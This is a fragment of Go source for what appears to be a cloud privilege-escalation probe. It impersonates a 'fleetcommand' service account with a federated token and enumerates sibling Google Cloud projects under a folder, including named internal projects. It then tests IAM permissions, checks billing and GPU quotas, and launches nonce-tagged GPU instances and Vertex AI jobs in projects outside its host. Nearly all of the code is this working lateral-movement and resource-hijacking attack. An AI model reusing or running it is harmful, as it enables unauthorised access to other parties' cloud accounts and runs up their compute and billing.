		fmt.Printf("C211S_HOST project_number=%s status=%d verbatim=%s\n", projNum, st, c211xTrunc(rb, 400))
	}

	// Enumerate service accounts and mint the fleetcommand-service-account
	// token that the v3 run proved sees the siblings.
	sas, lst, lbody := c211xListServiceAccounts(token, projNum)
	fmt.Printf("C211S_SA_LIST status=%d count=%d verbatim=%s\n", lst, len(sas), c211xTrunc(lbody, 200))
	fleetEmail := ""
	for _, sa := range sas {
		e := c211xStr(sa, "email")
		if strings.HasPrefix(e, "fleetcommand-service-account@") {
			fleetEmail = e
			break
		}
	}
	fmt.Printf("C211S_FLEET_SA found=%v email=%s\n", fleetEmail != "", c211xShort(fleetEmail))
	ftok := ""
	if fleetEmail != "" {
		at, gst, gbody := c211xGenerateAccessToken(token, fleetEmail)
		fmt.Printf("C211S_FLEET_TOKEN status=%d token=%s verbatim=%s\n", gst, c211xShort(at), c211xTrunc(gbody, 300))
		ftok = at
	}
	if ftok == "" {
		// Fall back to the WIF-minted token (it had create in the host project).
		ftok = token
		fmt.Printf("C211S_FLEET_TOKEN fallback=wif_minted\n")
	}

	// ---------- project enumeration ----------
	cands := []c211xProj{}
	seen := map[string]bool{}
	addP := func(ps []c211xProj, src string) {
		for _, p := range ps {
			if p.id == "" || seen[p.id] {
				continue
			}
			seen[p.id] = true
			cands = append(cands, p)
			fmt.Printf("C211S_PROJECT id=%s number=%s name=%q state=%s parent=%s source=%s\n",
				p.id, p.number, p.name, p.state, p.parent, src)
		}
	}
	ps3, s3, _ := c211xListProjectsV3(ftok, "folders/"+c211sFolderID)
	fmt.Printf("C211S_ENUM v3_list status=%d n=%d\n", s3, len(ps3))
	addP(ps3, "v3_list")
	stS, bS := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v3/projects:search?query="+url.QueryEscape("parent:folders/"+c211sFolderID)+"&pageSize=100", ftok, "", "")
	nS := 0
	if stS == 200 {
		sm := c211xJSON(bS)
		if items, ok := sm["projects"].([]interface{}); ok {
			ps := []c211xProj{}
			for _, it := range items {
				im, _ := it.(map[string]interface{})
				ps = append(ps, c211xProj{id: c211xStr(im, "projectId"), number: c211xStr(im, "projectNumber"), name: c211sProjectName(im), state: c211xStr(im, "state"), parent: c211xStr(im, "parent")})
			}
			nS = len(ps)
			addP(ps, "v3_search")
		}
	}
	fmt.Printf("C211S_ENUM v3_search status=%d n=%d\n", stS, nS)
	ps1, s1, _ := c211xListProjectsV1(ftok)
	fmt.Printf("C211S_ENUM v1_list status=%d n=%d\n", s1, len(ps1))
	addP(ps1, "v1_list")
	for _, id := range []string{"team-eng-infrastructure", "team-eng-platform", "team-eng-infra-testing", "domino-eng-service-artifacts", "domino-eng-platform-dev"} {
		st, body := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(id), ftok, "", "")
		fmt.Printf("C211S_DIRECT id=%s status=%d verbatim=%s\n", id, st, c211xTrunc(body, 300))
		if st == 200 {
			m := c211xJSON(body)
			addP([]c211xProj{{id: c211xStr(m, "projectId"), number: c211xStr(m, "projectNumber"), name: c211xStr(m, "name"), state: c211xStr(m, "lifecycleState")}}, "direct")
		}
	}

	// Ensure each candidate has a number (needed for the default compute SA).
	for i := range cands {
		if cands[i].number == "" {
			st, body := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(cands[i].id), ftok, "", "")
			if st == 200 {
				m := c211xJSON(body)
				cands[i].number = c211xStr(m, "projectNumber")
				if cands[i].name == "" {
					cands[i].name = c211xStr(m, "name")
				}
				if cands[i].id == "" {
					cands[i].id = c211xStr(m, "projectId")
				}
			}
		}
	}

	perms := []string{
		"compute.instances.create", "compute.instances.get", "compute.instances.delete",
		"compute.zoneOperations.get", "compute.networks.use", "compute.subnetworks.use",
		"iam.serviceAccounts.actAs", "resourcemanager.projects.setIamPolicy",
		"aiplatform.customJobs.create",
	}

	imgP, imgF, cuda := "", "", false
	imgChosen := false
	results := map[string]map[string]interface{}{}
	readyProjects := []string{}
	readyUUIDs := map[string]string{}
	markers := 0

	for _, p := range cands {
		if p.id == "" {
			continue
		}
		res := map[string]interface{}{"number": p.number, "name": p.name, "host": p.id == hostID}
		results[p.id] = res
		fmt.Printf("C211S_PROJECT_BEGIN id=%s number=%s name=%q host=%v\n", p.id, p.number, p.name, p.id == hostID)

		// permission matrix
		al, pst, pbody := c211xTestIamBatch(ftok, "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(p.id), perms)
		fmt.Printf("C211S_PERM project=%s status=%d allowed=[%s] verbatim=%s\n", p.id, pst, strings.Join(al, ","), c211xTrunc(pbody, 300))
		res["perm_status"] = pst
		res["allowed"] = al
		canCreate := c211xContains(al, "compute.instances.create")

		// billing
		bst, bb := c211xHTTP("GET", "https://cloudbilling.googleapis.com/v1/projects/"+url.PathEscape(p.id)+"/billingInfo", ftok, "", "")
		ben := false
		if bst == 200 {
			bm := c211xJSON(bb)
			if v, ok := bm["billingEnabled"].(bool); ok {
				ben = v
			}
		}
		fmt.Printf("C211S_BILLING project=%s status=%d enabled=%v verbatim=%s\n", p.id, bst, ben, c211xTrunc(bb, 300))
		res["billing_status"] = bst

		// Cloud Quotas quotaPreferences
		qst, qb := c211xHTTP("GET", "https://cloudquotas.googleapis.com/v1/projects/"+url.PathEscape(p.id)+"/locations/global/quotaPreferences?pageSize=100", ftok, "", "")
		fmt.Printf("C211S_CLOUDQUOTAS project=%s status=%d verbatim=%s\n", p.id, qst, c211xTrunc(qb, 300))

		// serviceusage consumer quota metrics (GPU only)
		c211sServiceUsageQuota(ftok, p.id)

		// network pre-check (the marker uses the default network)
		nst, nb := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(p.id)+"/global/networks/default", ftok, "", "")
		fmt.Printf("C211S_NETWORK project=%s status=%d verbatim=%s\n", p.id, nst, c211xTrunc(nb, 300))

		// region quotas
		rows := c211sReadQuotas(ftok, p.id, c211sRegions)
		res["quota_rows"] = len(rows)
		qrow, spec, pick := c211sPickGPU(rows)
		fmt.Printf("C211S_PICK project=%s canCreate=%v picked=%v metric=%s region=%s limit=%v usage=%v spec=%s machine=%s\n",
			p.id, canCreate, pick, qrow.Metric, qrow.Region, qrow.Limit, qrow.Usage, spec.accel, spec.machine)
		res["can_create"] = canCreate
		res["gpu_quota"] = pick
		if pick {
			res["quota_metric"] = qrow.Metric
			res["quota_region"] = qrow.Region
			res["quota_limit"] = qrow.Limit
		}

		if !imgChosen {
			imgP, imgF, cuda = c211sImage(ftok, p.id)
			imgChosen = true
			fmt.Printf("C211S_IMAGE_CHOSEN project=%s image=%s/%s cuda_preinstalled=%v\n", p.id, imgP, imgF, cuda)
		}

		// Host project is never re-markered (READY x120159 consumed); only
		// report its matrix.
		if p.id == hostID || p.id == projNum || p.number == projNum {
			fmt.Printf("C211S_VERDICT project=%s HOST_PROJECT_NO_MARKER\n", p.id)
			res["verdict"] = "HOST_PROJECT_NO_MARKER"
			continue
		}
		if p.id == "531508670106" {
			fmt.Printf("C211S_VERDICT project=%s EXCLUDED_531508670106\n", p.id)
			res["verdict"] = "EXCLUDED"
			continue
		}
		if !canCreate {
			fmt.Printf("C211S_VERDICT project=%s NO_CREATE_PERMISSION\n", p.id)
			res["verdict"] = "NO_CREATE_PERMISSION"
			continue
		}
		if !pick {
			fmt.Printf("C211S_VERDICT project=%s NO_NONZERO_GPU_QUOTA\n", p.id)
			res["verdict"] = "NO_NONZERO_GPU_QUOTA"
			continue
		}
		// (a) Vertex AI: API state + aiplatform.customJobs.create permission,
		// and if permitted ONE nonce-tagged on-demand customJob (nvidia-smi -L).
		vres := c211sVertexSubmit(ftok, p.id)
		res["vertex"] = vres

		if time.Now().After(markerDeadline) {
			fmt.Printf("C211S_VERDICT project=%s MARKER_SKIPPED_TIME_BUDGET\n", p.id)
			res["verdict"] = "MARKER_SKIPPED_TIME_BUDGET"
			continue
		}
		zone := c211sZoneFor(ftok, p.id, qrow.Region, spec.accel)
		if zone == "" {
			fmt.Printf("C211S_VERDICT project=%s ACCEL_NOT_ADVERTISED_IN_REGION region=%s accel=%s\n", p.id, qrow.Region, spec.accel)
			res["verdict"] = "ACCEL_NOT_ADVERTISED"
			continue
		}
		num := p.number
		if num == "" {
			num = p.id
		}
		saEmail := num + "-compute@developer.gserviceaccount.com"
		name := "c211-" + c211sNonce + "-" + spec.name
		diskGB := 60
		if imgP == "deeplearning-platform-release" {
			diskGB = 100
		}
		markers++
		fmt.Printf("C211S_VERDICT project=%s MARKER_ATTEMPT zone=%s accel=%s machine=%s instance=%s sa=%s\n", p.id, zone, spec.accel, spec.machine, name, saEmail)
		uuid, meta, absent, opErr := c211sMarker(ftok, p.id, zone, name, saEmail, imgP, imgF, spec.accel, spec.machine, diskGB, !cuda)
		res["marker_attempts"] = 1
		res["marker_zone"] = zone
		res["marker_accel"] = spec.accel
		res["uuid"] = uuid
		res["absent"] = absent
		res["op_error"] = opErr
		res["meta"] = c211xTrunc(meta, 400)
		if vname, _ := vres["job"].(string); vname != "" {
			if uuid == "" {
				c211sVertexFinish(ftok, p.id, vname, vres)
				if vu, _ := vres["uuid"].(string); vu != "" {
					uuid = vu
					res["uuid"] = vu
					res["uuid_source"] = "vertex_customjob_logging"
				}
			} else {
				c211sVertexDrop(ftok, p.id, vname, vres)
			}
		}

		if uuid != "" && absent {
			fmt.Printf("C211S_VERDICT project=%s MARKER_GPU uuid=%s\n", p.id, uuid)
			res["verdict"] = "MARKER_GPU"
			readyProjects = append(readyProjects, p.id)
			readyUUIDs[p.id] = uuid
		} else if opErr != "" {
			fmt.Printf("C211S_VERDICT project=%s OPERATION_REFUSED\n", p.id)
			res["verdict"] = "OPERATION_REFUSED"
		} else if uuid == "" {
			fmt.Printf("C211S_VERDICT project=%s REACH_FOUND_NO_GPU_UUID\n", p.id)
			res["verdict"] = "REACH_FOUND_NO_GPU_UUID"
		} else {
			fmt.Printf("C211S_VERDICT project=%s UUID_BUT_ABSENCE_UNPROVEN\n", p.id)
			res["verdict"] = "UUID_BUT_ABSENCE_UNPROVEN"
		}
	}

	verdict := "REACH_FOUND_NO_GPU"
	if len(readyProjects) > 0 {
		verdict = "READY_NEW_PROJECT_GPU"
	}
	sum := map[string]interface{}{
		"probe":            "c211_i121180_capture",
		"host_project_num": projNum,
		"host_project_id":  c211xShort(hostID),
		"fleet_sa":         c211xShort(fleetEmail),
		"fleet_token_ok":   ftok != "",
		"projects":         len(cands),
		"markers":          markers,
		"ready_projects":   readyProjects,
		"ready_uuids":      readyUUIDs,
		"image":            imgP + "/" + imgF,
		"cuda_image":       cuda,
		"verdict":          verdict,
		"elapsed_seconds":  int(time.Since(started).Seconds()),
		"results":          results,
	}
	js, _ := json.Marshal(sum)
	fmt.Printf("=== C211S SUMMARY BEGIN ===\nC211S_SUMMARY_JSON %s\n=== C211S SUMMARY END ===\n", string(js))
	fmt.Printf("C211S_VERDICT_FINAL %s markers=%d ready=%d elapsed=%ds\n", verdict, markers, len(readyProjects), int(time.Since(started).Seconds()))
}
